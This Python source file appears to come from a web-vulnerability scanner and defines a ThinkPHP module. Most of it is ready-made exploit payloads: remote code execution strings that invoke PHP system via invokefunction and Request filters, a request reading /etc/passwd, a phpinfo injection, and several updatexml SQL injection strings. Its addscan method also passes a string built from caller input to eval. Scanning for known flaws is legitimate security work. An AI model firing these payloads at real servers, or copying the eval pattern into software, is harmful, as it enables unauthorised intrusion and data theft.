#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ThinkPHP扫描类: 
        1. ThinkPHP5 未开启强制路由RCE
            CNVD-2018-24942
                Payload: https://bbs.zkaq.cn/t/5636.html

        2. ThinkPHP5 核心类Request远程代码执行
            CNNVD-201901-445
                Payload: https://bbs.zkaq.cn/t/5636.html

        3. ThinkPHP2.x preg_replace函数使用不当RCE
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/2-rce/

        4. ThinkPHP5 ids参数 sql注入漏洞
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

        5. ThinkPHP5.x 远程代码执行
            CVE-2018-1002015
                Payload: https://www.cnblogs.com/defyou/p/15762860.html

其它奇奇怪怪的Payload: https://baizesec.github.io/
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.ThinkPHP._2_x_rce import _2_x_rce_scan
from payloads.ThinkPHP._5_ids_sqlinject import _5_ids_sqlinject_scan
from payloads.ThinkPHP.cnnvd_201901_445 import cnnvd_201901_445_scan
from payloads.ThinkPHP.cnvd_2018_24942 import cnvd_2018_24942_scan
from payloads.ThinkPHP.cve_2018_1002015 import cve_2018_1002015_scan

class ThinkPHP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ThinkPHP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2018_24942_payloads = [
            {
                'path': 'index.php?s=index/\\think\Request/input&filter[]=system&data={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>',
                'data': ''
            }
        ]

        self.cnnvd_201901_445_payloads = [
            {
                'path': 'index.php?s=captcha',
                'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}'.format(self.cmd)
            }
        ]

        self.thinkphp_2_x_rce_payloads = [
            {
                'path': 'index.php?s=/index/index/name/$%7B@phpinfo()%7D',
                'data': ''
            }
        ]

        self.thinkphp_5_ids_sqlinject_payloads = [
            {
                'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1',
                'data': ''
            }
        ]

        self.cve_2018_1002015_payloads = [
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=system&vars[1][]='+self.cmd,
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
                'headers': head.merge(self.headers, {})
            }
        ]

        # * 以下payload没有找到测试环境, 暂时没写poc
        self.thinkphp_5_options_sqlinject_payloads = [
            {
                'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
                'data': ''
            },
            {
                'path': 'index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23',
                'data': ''
            }
        ]

        self.thinkphp_5_username_sqlinject_payloads = [
            {
                'path': 'index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 ',
                'data': ''
            },
            {
                'path': '?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 ',
                'data': ''
            }
        ]

        self.thinkphp_5_orderby_sqlinject_payloads = [
            {
                'path': 'index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 ',
                'data': ''
            }
        ]

        self.thinkphp_5_include_payloads = [
            {
                'path': 'index/index/index?cacheFile=1.jpg',
                'data': ''
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.thinkphp_2_x_rce_scan, url=url),
            thread(target=self.thinkphp_5_ids_sqlinject_scan, url=url),
            thread(target=self.cnnvd_201901_445_scan, url=url),
            thread(target=self.cnvd_2018_24942_scan, url=url),
            thread(target=self.cve_2018_1002015_scan, url=url)
        ]

ThinkPHP.thinkphp_2_x_rce_scan = _2_x_rce_scan
ThinkPHP.thinkphp_5_ids_sqlinject_scan = _5_ids_sqlinject_scan
ThinkPHP.cnnvd_201901_445_scan = cnnvd_201901_445_scan
ThinkPHP.cnvd_2018_24942_scan = cnvd_2018_24942_scan
ThinkPHP.cve_2018_1002015_scan = cve_2018_1002015_scan

thinkphp = ThinkPHP()